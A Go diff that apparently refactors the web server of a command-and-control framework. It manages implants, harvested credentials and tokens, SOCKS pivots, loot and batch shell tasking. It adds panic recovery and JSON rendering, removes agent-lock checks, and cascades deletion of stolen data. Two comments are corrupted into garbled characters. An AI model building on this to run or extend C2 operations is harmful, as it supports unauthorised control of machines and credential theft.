@@ -1,10 +1,8 @@
-package server
+﻿package server
 
 import (
-	"bytes"
 	"encoding/csv"
 	"fmt"
-	"html/template"
 	"log/slog"
 	"net/http"
 	"os"
@@ -39,23 +37,30 @@ func (s *Server) handleDashboard(c *gin.Context) {
 	)
 
 	wg.Add(11)
-	go func() { defer wg.Done(); s.db.Model(&db.Implant{}).Count(&totalAgents) }()
+	dashRecover := func() {
+		if r := recover(); r != nil {
+			slog.Error("Dashboard stats goroutine panicked", "recover", r)
+		}
+	}
+	go func() { defer wg.Done(); defer dashRecover(); s.db.Model(&db.Implant{}).Count(&totalAgents) }()
 	go func() {
 		defer wg.Done()
+		defer dashRecover()
 		s.db.Model(&db.Implant{}).Where("last_seen > ?", offlineCutoff).Count(&onlineAgents)
 	}()
 	go func() {
 		defer wg.Done()
+		defer dashRecover()
 		s.db.Model(&db.Task{}).Where("created_at >= ?", time.Now().AddDate(0, 0, -1)).Count(&todayTasks)
 	}()
-	go func() { defer wg.Done(); s.db.Model(&db.Task{}).Where("status = ?", "pending").Count(&pendingTasks) }()
-	go func() { defer wg.Done(); s.db.Model(&db.Task{}).Where("status = ?", "failed").Count(&failedTasks) }()
-	go func() { defer wg.Done(); s.db.Model(&db.Task{}).Count(&totalTasks) }()
-	go func() { defer wg.Done(); s.db.Model(&db.CredentialEntry{}).Count(&totalCreds) }()
-	go func() { defer wg.Done(); s.db.Model(&db.TokenEntry{}).Count(&totalTokens) }()
-	go func() { defer wg.Done(); s.db.Model(&db.AuditLog{}).Count(&totalAudits) }()
-	go func() { defer wg.Done(); s.db.Model(&db.SocksSession{}).Count(&totalSocks) }()
-	go func() { defer wg.Done(); s.db.Model(&db.Listener{}).Count(&totalListeners) }()
+	go func() { defer wg.Done(); defer dashRecover(); s.db.Model(&db.Task{}).Where("status = ?", "pending").Count(&pendingTasks) }()
+	go func() { defer wg.Done(); defer dashRecover(); s.db.Model(&db.Task{}).Where("status = ?", "failed").Count(&failedTasks) }()
+	go func() { defer wg.Done(); defer dashRecover(); s.db.Model(&db.Task{}).Count(&totalTasks) }()
+	go func() { defer wg.Done(); defer dashRecover(); s.db.Model(&db.CredentialEntry{}).Count(&totalCreds) }()
+	go func() { defer wg.Done(); defer dashRecover(); s.db.Model(&db.TokenEntry{}).Count(&totalTokens) }()
+	go func() { defer wg.Done(); defer dashRecover(); s.db.Model(&db.AuditLog{}).Count(&totalAudits) }()
+	go func() { defer wg.Done(); defer dashRecover(); s.db.Model(&db.SocksSession{}).Count(&totalSocks) }()
+	go func() { defer wg.Done(); defer dashRecover(); s.db.Model(&db.Listener{}).Count(&totalListeners) }()
 	wg.Wait()
 
 	// Online agent list (recently active) - optimized with SELECT
@@ -92,7 +97,7 @@ func (s *Server) handleDashboard(c *gin.Context) {
 		data[k] = v
 	}
 
-	s.renderPage(c, "dashboard_content", data)
+	s.renderPageOrJSON(c, data)
 }
 
 func (s *Server) handleAgents(c *gin.Context) {
@@ -163,7 +168,7 @@ func (s *Server) handleAgents(c *gin.Context) {
 		data[k] = v
 	}
 
-	s.renderPage(c, "agents_content", data)
+	s.renderPageOrJSON(c, data)
 }
 
 func (s *Server) handleAgentDetail(c *gin.Context) {
@@ -296,7 +301,7 @@ func (s *Server) handleAgentDetail(c *gin.Context) {
 		data[k] = v
 	}
 
-	s.renderPage(c, "agent_detail_content", data)
+	s.renderPageOrJSON(c, data)
 }
 
 func (s *Server) handleKillAgent(c *gin.Context) {
@@ -307,14 +312,6 @@ func (s *Server) handleKillAgent(c *gin.Context) {
 		return
 	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	// Check lock (allow locker to kill their own agent)
-	user, _ := c.Get("user")
-	username := fmt.Sprintf("%v", user)
-	if holder, ok := s.checkAgentLock(id, username); !ok {
-		c.JSON(http.StatusLocked, gin.H{"error": fmt.Sprintf("agent locked by %s", holder), "locked_by": holder})
 		return
 	}
 
@@ -378,6 +375,7 @@ func (s *Server) handleUpdateNote(c *gin.Context) {
 	}
 	s.db.Model(&db.Implant{}).Where("id = ?", id).Updates(updates)
 	s.LogAuditRecord(c, "update_notes", "agent", id, fmt.Sprintf("notes/tags updated"), true, nil)
+	s.broadcastAgentDataUpdate(id, updates)
 	c.JSON(http.StatusOK, gin.H{"success": true})
 }
 
@@ -397,6 +395,31 @@ func (s *Server) deleteAgentRecord(id string) bool {
 	if err := tx.Where("agent_id = ?", id).Delete(&db.Task{}).Error; err != nil {
 		tx.Rollback()
 		slog.Error("Failed to delete tasks", "agent_id", id, "err", err)
+		return false
+	}
+	if err := tx.Where("agent_id = ?", id).Delete(&db.CredentialEntry{}).Error; err != nil {
+		tx.Rollback()
+		slog.Error("Failed to delete credentials", "agent_id", id, "err", err)
+		return false
+	}
+	if err := tx.Where("agent_id = ?", id).Delete(&db.TokenEntry{}).Error; err != nil {
+		tx.Rollback()
+		slog.Error("Failed to delete tokens", "agent_id", id, "err", err)
+		return false
+	}
+	if err := tx.Where("agent_id = ?", id).Delete(&db.SocksSession{}).Error; err != nil {
+		tx.Rollback()
+		slog.Error("Failed to delete socks sessions", "agent_id", id, "err", err)
+		return false
+	}
+	if err := tx.Where("agent_id = ?", id).Delete(&db.ScanResult{}).Error; err != nil {
+		tx.Rollback()
+		slog.Error("Failed to delete scan results", "agent_id", id, "err", err)
+		return false
+	}
+	if err := tx.Where("agent_id = ?", id).Delete(&db.NetworkHost{}).Error; err != nil {
+		tx.Rollback()
+		slog.Error("Failed to delete network hosts", "agent_id", id, "err", err)
 		return false
 	}
 	if err := tx.Delete(&db.Implant{}, "id = ?", id).Error; err != nil {
@@ -473,9 +496,6 @@ func (s *Server) handleBatchCommand(c *gin.Context) {
 		req.TaskType = "shell"
 	}
 
-	user, _ := c.Get("user")
-	username := fmt.Sprintf("%v", user)
-
 	taskCount := 0
 	skippedLocked := 0
 	failedCount := 0
@@ -484,13 +504,6 @@ func (s *Server) handleBatchCommand(c *gin.Context) {
 		var agent db.Implant
 		if err := s.db.First(&agent, "id = ?", agentID).Error; err != nil {
 			failedCount++
-			continue
-		}
-
-		// Skip locked agents
-		if holder, ok := s.checkAgentLock(agentID, username); !ok {
-			slog.Debug("Batch: skip locked agent", "agent_id", agentID, "locked_by", holder)
-			skippedLocked++
 			continue
 		}
 
@@ -626,7 +639,7 @@ func (s *Server) handleTaskHistory(c *gin.Context) {
 		data[k] = v
 	}
 
-	s.renderPage(c, "tasks_content", data)
+	s.renderPageOrJSON(c, data)
 }
 
 // handleExportTasks exports tasks as CSV for reporting
@@ -704,30 +717,18 @@ func (s *Server) getNavStats() gin.H {
 	var pendingTasks int64
 	s.db.Model(&db.Task{}).Where("status = ?", "pending").Count(&pendingTasks)
 
+	onlineUsers := int64(len(s.getOnlineUsers()))
+
 	navStatsCache = gin.H{
 		"OnlineCount":   online,
 		"StaleCount":    stale,
 		"OfflineCount":  offlineAgents,
 		"ListenerCount": listenerCount,
 		"PendingCount":  pendingTasks,
+		"OnlineUsers":   onlineUsers,
 	}
 	navStatsCacheTime = time.Now()
 	return navStatsCache
-}
-
-// renderPage is a helper method to render templates (optimization #8)
-func (s *Server) renderPage(c *gin.Context, tmplName string, data gin.H) {
-	s.addUserToData(c, data)
-	var buf bytes.Buffer
-	if err := s.tmpl.ExecuteTemplate(&buf, tmplName, data); err != nil {
-		slog.Error("Template render error", "template", tmplName, "err", err)
-		c.String(http.StatusInternalServerError, "Template error: " + err.Error())
-		return
-	}
-	useBundles := !isDevMode()
-	data["Content"] = appendPageScripts(tmplName, template.HTML(buf.String()), useBundles)
-	c.Header("Content-Type", "text/html; charset=utf-8")
-	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
 }
 
 func detectLanguage(c *gin.Context) string {
@@ -778,9 +779,8 @@ func (s *Server) addUserToData(c *gin.Context, data gin.H) {
 	data["CurrentLangInfo"] = langInfo
 	data["IsRTL"] = langInfo.RTL
 
-	data["UseBundles"] = !isDevMode()
 	data["LocalesJSON"] = GetTranslationsJSON(currentLang)
-	data["OnlineUsers"] = s.onlineUsersForRequest(c)
+	data["OnlineUsers"] = []map[string]string{}
 	if _, ok := data["SearchQuery"]; !ok {
 		data["SearchQuery"] = ""
 	}
@@ -802,7 +802,7 @@ func (s *Server) handlePivoting(c *gin.Context) {
 		data[k] = v
 	}
 
-	s.renderPage(c, "pivoting_content", data)
+	s.renderPageOrJSON(c, data)
 }
 
 // handleTopologyPage renders the network topology visualization
@@ -816,7 +816,7 @@ func (s *Server) handleTopologyPage(c *gin.Context) {
 		data[k] = v
 	}
 
-	s.renderPage(c, "topology_content", data)
+	s.renderPageOrJSON(c, data)
 }
 
 // handleTopologyData returns JSON nodes and edges for the topology graph
@@ -846,7 +846,7 @@ func (s *Server) handleTopologyData(c *gin.Context) {
 		})
 	}
 
-	// Agent nodes + listener→agent edges
+	// Agent nodes + listener鈫抋gent edges
 	for _, a := range agents {
 		online := a.LastSeen.After(onlineCutoff)
 		label := a.Hostname
@@ -874,7 +874,7 @@ func (s *Server) handleTopologyData(c *gin.Context) {
 			})
 		}
 
-		// P2P edge: parent→child
+		// P2P edge: parent鈫抍hild
 		if a.ParentID != "" {
 			edges = append(edges, map[string]interface{}{
 				"from":   fmt.Sprintf("agent-%s", a.ParentID),
@@ -956,7 +956,7 @@ func (s *Server) handleLootPage(c *gin.Context) {
 		data[k] = v
 	}
 
-	s.renderPage(c, "loot_content", data)
+	s.renderPageOrJSON(c, data)
 }
 
 // handleLinkAgent links a child agent to a parent agent for P2P relay
@@ -1043,3 +1043,4 @@ func (s *Server) handleListUnlinkedAgents(c *gin.Context) {
 	s.db.Where("parent_id = '' OR parent_id IS NULL").Order("hostname asc").Find(&agents)
 	c.JSON(http.StatusOK, agents)
 }
+
